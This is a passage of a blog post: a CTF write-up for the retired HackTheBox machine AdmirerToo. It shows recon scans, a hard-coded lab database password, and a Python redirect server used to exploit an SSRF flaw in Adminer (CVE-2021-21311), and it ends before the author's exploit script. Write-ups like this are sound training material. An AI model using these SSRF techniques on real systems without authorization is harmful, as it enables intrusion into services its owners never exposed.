<!DOCTYPE html>
<html lang=en>
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="AdmirerToo just retired on HackTheBox. It was a Hard difficulty Linux box. It was well designed and required to chain several exploits in order to retrieve the flags. The path to user was not that o">
<meta property="og:type" content="article">
<meta property="og:title" content="HackTheBox - AdmirerToo">
<meta property="og:url" content="https://hg8.sh/posts/admirertoo/index.html">
<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
<meta property="og:description" content="AdmirerToo just retired on HackTheBox. It was a Hard difficulty Linux box. It was well designed and required to chain several exploits in order to retrieve the flags. The path to user was not that o">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166099416-e02b4a36-942c-4177-9532-89b1781b0e85.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166100552-bc08c462-cf7e-4f7a-8911-b00771e42a69.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166101730-f0ef713b-d71e-484c-a151-019ec4a43dff.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166109194-e5394179-4a36-4396-a92a-c3bd88778326.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166109316-db9ee2bd-4472-4d26-b2d6-47bdb3f94868.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166157419-74b39d1a-00fb-44b1-87a6-16ca85fe01fa.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166157962-5641a55a-f3f0-475a-9733-0ca5d2f9bda7.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166158220-76cdd510-dcc0-467b-a03d-2686c1f7932c.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166158784-88bca3af-6e56-44f2-8a91-a03e9f76ce56.png">
<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/166314333-56a95f13-e803-4e87-93db-06c44bdbc0c4.png">
<meta property="article:published_time" content="2022-05-27T22:00:00.000Z">
<meta property="article:modified_time" content="2022-08-04T08:37:52.825Z">
<meta property="article:author" content="hg8">
<meta property="article:tag" content="linux">
<meta property="article:tag" content="ssrf">
<meta property="article:tag" content="vhost">
<meta property="article:tag" content="ffuf">
<meta property="article:tag" content="fail2ban">
<meta property="article:tag" content="python">
<meta property="article:tag" content="port forwarding">
<meta property="article:tag" content="PHP Object Injection">
<meta property="article:tag" content="phpggc">
<meta property="article:tag" content="CVE-2020-35476">
<meta property="article:tag" content="CVE-2021-21311">
<meta property="article:tag" content="CVE-2021-32749">
<meta property="article:tag" content="opencats">
<meta property="article:tag" content="opentsdb">
<meta property="article:tag" content="whois">
<meta property="article:tag" content="regex">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/166099416-e02b4a36-942c-4177-9532-89b1781b0e85.png">
    
    
        
          
              <link rel="shortcut icon" href="/images/favicon.ico">
          
        
        
          
            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
          
        
        
          
            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
          
        
    
     
    <title>HackTheBox - AdmirerToo :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
    
<link rel="stylesheet" href="/css/style.css">

    
    
<meta name="generator" content="Hexo 5.4.0"><link rel="alternate" href="/atom.xml" title="hg8's Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups." type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" href="/posts/bugbounty/ssrf-to-rce-aws/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" href="/posts/fingerprint/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
    </span>
    <br/>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-flag"><span class="toc-number">1.</span> <span class="toc-text">User flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminer-database"><span class="toc-number">1.2.</span> <span class="toc-text">Adminer database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SSRF-on-Adminer"><span class="toc-number">1.3.</span> <span class="toc-text">SSRF on Adminer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Adminer-SSRF-%E2%86%92-OpenTSBD-RCE"><span class="toc-number">1.4.</span> <span class="toc-text">Adminer SSRF → OpenTSBD RCE</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Privilege-escalation-%E2%86%92-jennifer-user"><span class="toc-number">1.5.</span> <span class="toc-text">Privilege escalation → jennifer user</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#OpenCATS-database"><span class="toc-number">1.6.</span> <span class="toc-text">OpenCATS database</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#jennifer-password-re-use"><span class="toc-number">1.7.</span> <span class="toc-text">jennifer password re-use</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-flag"><span class="toc-number">2.</span> <span class="toc-text">Root flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Into-the-Opencats-rabbit-hole"><span class="toc-number">2.2.</span> <span class="toc-text">Into the Opencats rabbit hole</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Fail2ban-Remote-Code-Execution"><span class="toc-number">2.3.</span> <span class="toc-text">Fail2ban Remote Code Execution</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Malicious-whois-server"><span class="toc-number">2.4.</span> <span class="toc-text">Malicious whois server</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#References"><span class="toc-number">3.</span> <span class="toc-text">References</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        <header id="header">
  <a href="/">
  
      <div id="logo" style="background-image: url(/images/logo.webp);"></div>
  
    <span class="logo__mark"></span>
    <span class="logo__text">./hg8.sh</span>
    <span class="logo__cursor"></span>
  </a>
  <div id="nav">
    <ul>
      <li class="icon">
        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
      </li>
       
        <li><a href="/">Home</a></li>
       
        <li><a href="/about/">About</a></li>
       
        <li><a href="/archives/">Posts</a></li>
       
        <li><a href="/search/">Search</a></li>
      
    </ul>
  </div>
</header>

        
          <br>
          <br>
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        HackTheBox - AdmirerToo
    </h1>



    <div class="meta"> 
      
    <div class="postdate">
      
        <time datetime="2022-05-27T22:00:00.000Z" itemprop="datePublished">28-05-2022</time>
        
      
    </div>


      — Written by 
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">hg8</span>
      </span>
      —
      26 min read
    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <img alt="admiretoo-hackthebox" src="https://user-images.githubusercontent.com/9076747/166099416-e02b4a36-942c-4177-9532-89b1781b0e85.png" width="578">

<p>AdmirerToo just retired on HackTheBox. It was a Hard difficulty Linux box. It was well designed and required to chain several exploits in order to retrieve the flags. The path to user was not that obvious and required a lot of enumeration. The box relied mainly on common vulnerabilities, with some of them rather unusual but very interesting to chain. In the end, it’s a tough but good box that I recommend.</p>
<p><strong>Tl;Dr:</strong> To get the user flag you first have to find and exploit a SSRF vulnerability in Adminer to discover a local instance of OpenTSDB, then use the SSRF to exploit a command injection vulnerability in OpenTSDB to get your first shell. After enumeration, a database password re-use allows you to connect and get the user flag.<br>For the root flag you first have to discover an Opencats instance vulnerable to arbitrary file write. A fail2ban client is vulnerable to command injection when you can control the result of a <code>whois</code> query to your attacking IP address. Using the Opencats instance to write a <code>whois.conf</code> file pointing to your malicious <code>whois</code> server allows you to exploit the Fail2ban command injection to get a root shell.</p>
<hr>
<p>First things first, let’s add the box IP to the “hosts” file:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">&quot;10.129.111.234 admirertoo.htb&quot;</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>

<p>And let’s start!</p>
<h2 id="User-flag"><a href="#User-flag" class="headerlink" title="User flag"></a>User flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>We start we the usual <code>nmap</code> scan to discover the running services:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC admirertoo.htb</span><br><span class="line">Starting Nmap 7.92 ( https://nmap.org ) at 2022-04-30 09:11 UTC</span><br><span class="line">Nmap scan report <span class="keyword">for</span> admirertoo.htb (10.129.111.234)</span><br><span class="line">Host is up (0.031s latency).</span><br><span class="line">Not shown: 998 closed tcp ports (conn-refused)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)</span><br><span class="line">| ssh-hostkey:</span><br><span class="line">|   2048 99:33:47:e6:5f:1f:2e:fd:45:a4:ee:6b:78:fb:c0:e4 (RSA)</span><br><span class="line">|   256 4b:28:53:64:92:57:84:77:5f:8d:bf:af:d5:22:e1:10 (ECDSA)</span><br><span class="line">|_  256 71:ee:8e:e5:98:ab:08:43:3b:86:29:57:23:26:e9:10 (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">|_http-title: Admirer</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap <span class="keyword">done</span>: 1 IP address (1 host up) scanned <span class="keyword">in</span> 9.02 seconds</span><br></pre></td></tr></table></figure>

<p>As usual we have the port SSH (<code>22</code>) open as well as port <code>80</code> with a simple image gallery landing page:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/166100552-bc08c462-cf7e-4f7a-8911-b00771e42a69.png" alt="https://user-images.githubusercontent.com/9076747/166100552-bc08c462-cf7e-4f7a-8911-b00771e42a69.png"></p>
<p>Let’s do the usual web page enumeration on this page.<br>Trying to fuzz for hidden endpoints with <code>gobuster</code> doesn’t return anything interesting: </p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u <span class="string">&quot;http://admirertoo.htb&quot;</span> -w ~/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://admirertoo.htb</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /home/vagrant/SecLists/Discovery/Web-Content/big.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2022/04/30 09:25:11 Starting gobuster <span class="keyword">in</span> directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess            (Status: 403) [Size: 330]</span><br><span class="line">/.htpasswd            (Status: 403) [Size: 330]</span><br><span class="line">/css                  (Status: 301) [Size: 365] [--&gt; http://admirertoo.htb/css/]</span><br><span class="line">/fonts                (Status: 301) [Size: 367] [--&gt; http://admirertoo.htb/fonts/]</span><br><span class="line">/img                  (Status: 301) [Size: 365] [--&gt; http://admirertoo.htb/img/]</span><br><span class="line">/js                   (Status: 301) [Size: 364] [--&gt; http://admirertoo.htb/js/]</span><br><span class="line">/manual               (Status: 301) [Size: 368] [--&gt; http://admirertoo.htb/manual/]</span><br></pre></td></tr></table></figure>

<p>Maybe we can try to brute-force <code>vhost</code> to find subdomains. But we get no luck either using <code>fuff</code>:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -u http://admirertoo.htb/ -H <span class="string">&quot;Host: FUZZ.admirertoo.htb&quot;</span> -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 14099</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.4.1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://admirertoo.htb/</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /home/vagrant/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.admirertoo.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 14099</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">:: Progress: [100000/100000] :: Job [1/1] :: 1117 req/sec :: Duration: [0:01:50] :: Errors: 0 :: </span></span><br></pre></td></tr></table></figure>

<p>Now what? Maybe it’s time to do what we should have done from the beginning and review the landing page manually to see if we can find any information that automated tools can’t find.<br>And indeed, while visiting a non-existing page we notice an interesting new domain in the <code>mailto</code> field:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ curl admirertoo.htb/hg8</span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">HTML</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">&quot;-//IETF//DTD HTML 2.0//EN&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>404 Not Found<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">h1</span>&gt;</span>Not Found<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span>The requested URL was not found on this server.<span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">address</span>&gt;</span>Apache/2.4.38 (Debian) Server at <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;mailto:webmaster@admirer-gallery.htb&quot;</span>&gt;</span>admirertoo.htb<span class="tag">&lt;/<span class="name">a</span>&gt;</span> Port 80<span class="tag">&lt;/<span class="name">address</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Let’s add <code>admirer-gallery.htb</code> to our host file and retry our <code>vhost</code> discovery:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ ffuf -u http://admirer-gallery.htb/ -H <span class="string">&quot;Host: FUZZ.admirer-gallery.htb&quot;</span> -w ~/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -fs 14099</span><br><span class="line"></span><br><span class="line">        /<span class="string">&#x27;___\  /&#x27;</span>___\           /<span class="string">&#x27;___\</span></span><br><span class="line"><span class="string">       /\ \__/ /\ \__/  __  __  /\ \__/</span></span><br><span class="line"><span class="string">       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\</span></span><br><span class="line"><span class="string">        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/</span></span><br><span class="line"><span class="string">         \ \_\   \ \_\  \ \____/  \ \_\</span></span><br><span class="line"><span class="string">          \/_/    \/_/   \/___/    \/_/</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">       v1.4.1</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> :: Method           : GET</span></span><br><span class="line"><span class="string"> :: URL              : http://admirer-gallery.htb/</span></span><br><span class="line"><span class="string"> :: Wordlist         : FUZZ: /home/vagrant/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt</span></span><br><span class="line"><span class="string"> :: Header           : Host: FUZZ.admirer-gallery.htb</span></span><br><span class="line"><span class="string"> :: Follow redirects : false</span></span><br><span class="line"><span class="string"> :: Calibration      : false</span></span><br><span class="line"><span class="string"> :: Timeout          : 10</span></span><br><span class="line"><span class="string"> :: Threads          : 40</span></span><br><span class="line"><span class="string"> :: Matcher          : Response status: 200,204,301,302,307,401,403,405,500</span></span><br><span class="line"><span class="string"> :: Filter           : Response size: 14099</span></span><br><span class="line"><span class="string">________________________________________________</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">db                      [Status: 200, Size: 2569, Words: 113, Lines: 63, Duration: 187ms]</span></span><br></pre></td></tr></table></figure>

<p>We finally find something interesting. After adding <code>db.admirer-gallery.htb</code> to our host file we can access an <code>Adminer</code> database instance.</p>
<blockquote>
<p>Adminer (formerly phpMinAdmin) is a full-featured database management tool written in PHP. Conversely to phpMyAdmin, it consists of a single file ready to deploy to the target server.<br><a target="_blank" rel="noopener" href="https://www.adminer.org/">https://www.adminer.org/</a></p>
</blockquote>
<h3 id="Adminer-database"><a href="#Adminer-database" class="headerlink" title="Adminer database"></a>Adminer database</h3><p><img src="https://user-images.githubusercontent.com/9076747/166101730-f0ef713b-d71e-484c-a151-019ec4a43dff.png" alt="https://user-images.githubusercontent.com/9076747/166101730-f0ef713b-d71e-484c-a151-019ec4a43dff.png"></p>
<p>Oddly enough no credentials are needed to access the database. While looking at the source code we can see that the database password is actually hard-coded into the HTML form:</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">&quot;&quot;</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[driver]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;server&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[server]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;localhost&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[username]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admirer_ro&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[password]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1w4nn4b3adm1r3d2!&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[db]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;admirer&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;hidden&quot;</span> <span class="attr">name</span>=<span class="string">&quot;auth[permanent]&quot;</span> <span class="attr">value</span>=<span class="string">&quot;1&quot;</span> /&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;Enter&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>The database itself doesn’t hold any interesting information.<br>Let’s see if we can exploit a vulnerability in Adminer instead. We know from the login page that the running version is <code>4.7.8</code>.</p>
<h3 id="SSRF-on-Adminer"><a href="#SSRF-on-Adminer" class="headerlink" title="SSRF on Adminer"></a>SSRF on Adminer</h3><p>A quick Google search return the following vulnerability that looks interesting to us:</p>
<blockquote>
<p><strong>CVE-2021-21311</strong>: In Adminer from version 4.0.0 and before 4.7.9 there is a server-side request forgery vulnerability. This is fixed in version 4.7.9.<br><a target="_blank" rel="noopener" href="https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf">https://github.com/vrana/adminer/files/5957311/Adminer.SSRF.pdf</a></p>
</blockquote>
<p>The issue seems to rely on the <code>elastic</code> connection module. While configured for Elasticsearch Adminer will try to connect to the provided host (in our case our attacking machine with specific server response) and <a target="_blank" rel="noopener" href="https://github.com/vrana/adminer/commit/ccd2374b0b12bd547417bf0dacdf153826c83351">return the request response into the error message</a>.</p>
<p>The PoC PDF outlines the vulnerability in detail. We should be able to reproduce it on our instance. First of all we need to set up an intercept script to redirect traffic to localhost:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> http.server <span class="keyword">import</span> HTTPServer, BaseHTTPRequestHandler</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">len</span>(sys.argv)-<span class="number">1</span> != <span class="number">2</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Usage: &#123;&#125; &lt;port_number&gt; &lt;url&gt;&quot;</span>.<span class="built_in">format</span>(sys.argv[<span class="number">0</span>]))</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Redirect</span>(<span class="params">BaseHTTPRequestHandler</span>):</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">do_GET</span>(<span class="params">self</span>):</span></span><br><span class="line">       self.send_response(<span class="number">302</span>)</span><br><span class="line">       self.send_header(<span class="string">&#x27;Location&#x27;</span>, sys.argv[<span class="number">2</span>])</span><br><span class="line">       self.end_headers()</span><br><span class="line"></span><br><span class="line">HTTPServer((<span class="string">&quot;&quot;</span>, <span class="built_in">int</span>(sys.argv[<span class="number">1</span>])), Redirect).serve_forever()</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python redirect.py 80 http://127.0.0.1</span><br></pre></td></tr></table></figure>

<p>We can then use Burp Suite to intercept and modify the connection request in order to, firstly, point the connector to our attacking machine (which will be intercepted by the <code>[redirect.py](http://redirect.py)</code> script) and then modify the <code>auth_driver</code> to the vulnerable <code>elastic</code> driver:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/166109194-e5394179-4a36-4396-a92a-c3bd88778326.png" alt="https://user-images.githubusercontent.com/9076747/166109194-e5394179-4a36-4396-a92a-c3bd88778326.png"></p>
<p>Once the request forwarded we can see an incoming request confirming the SSRF succeed:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ sudo python redirect.py 80 http://127.0.0.1</span><br><span class="line">10.129.111.234 - - [30/Apr/2022 12:02:24] <span class="string">&quot;GET / HTTP/1.0&quot;</span> 302 -</span><br></pre></td></tr></table></figure>

<p>As expected Adminer return the content of the main application HTML page in the error message:</p>
<p><img src="https://user-images.githubusercontent.com/9076747/166109316-db9ee2bd-4472-4d26-b2d6-47bdb3f94868.png" alt="https://user-images.githubusercontent.com/9076747/166109316-db9ee2bd-4472-4d26-b2d6-47bdb3f94868.png"></p>
<p>We can now access local services running on the server through this SSRF vulnerability. </p>
<p>Since it’s a bit cumbersome to use Burp intercept every time let’s write a quick Python script to exploit this vulnerability more easily:</p>
